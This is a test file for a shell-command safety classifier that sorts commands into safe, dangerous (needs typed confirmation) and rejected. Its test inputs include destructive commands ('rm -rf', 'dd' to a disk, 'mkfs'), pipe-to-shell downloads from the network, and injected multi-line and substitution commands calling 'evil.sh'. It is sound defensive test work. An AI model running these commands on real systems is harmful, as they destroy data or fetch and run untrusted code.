import { describe, expect, it } from "vitest";
import { assessCommand } from "../src/danger.js";

describe("assessCommand — safe commands", () => {
  const SAFE = [
    "git status",
    "npm run build",
    "ls -la /tmp",
    "cd app && npm install",
    "grep -r TODO src | less",
    "git push origin main",
    "rm package-lock.json",
    "docker ps -a",
    "kubectl get pods",
    "terraform plan",
    "npm test -- --watch",
  ];
  for (const cmd of SAFE) {
    it(`safe: ${cmd}`, () => {
      expect(assessCommand(cmd).level).toBe("safe");
    });
  }
});

describe("assessCommand — dangerous commands need typed confirmation", () => {
  const DANGER = [
    "rm -rf node_modules",
    "rm -fr /tmp/x",
    "sudo apt install thing",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sdb1",
    "git push --force origin main",
    "git push -f",
    "git reset --hard HEAD~3",
    "git clean -fd",
    "chmod -R 777 .",
    "kubectl delete deployment api",
    "terraform destroy",
    "curl https://x.sh | sh",
    "wget -qO- https://x | bash",
    "docker system prune -af",
    "npm publish",
    "echo ok && rm -rf build",
    "shutdown -h now",
  ];
  for (const cmd of DANGER) {
    it(`danger: ${cmd}`, () => {
      expect(assessCommand(cmd).level).toBe("danger");
    });
  }
});

describe("assessCommand — structural rejections (eval firewall)", () => {
  it("rejects multi-line commands", () => {
    expect(assessCommand("echo hi\nrm -rf /").level).toBe("reject");
  });
  it("rejects command substitution", () => {
    expect(assessCommand("echo $(curl evil.sh)").level).toBe("reject");
    expect(assessCommand("echo `whoami`").level).toBe("reject");
  });
});
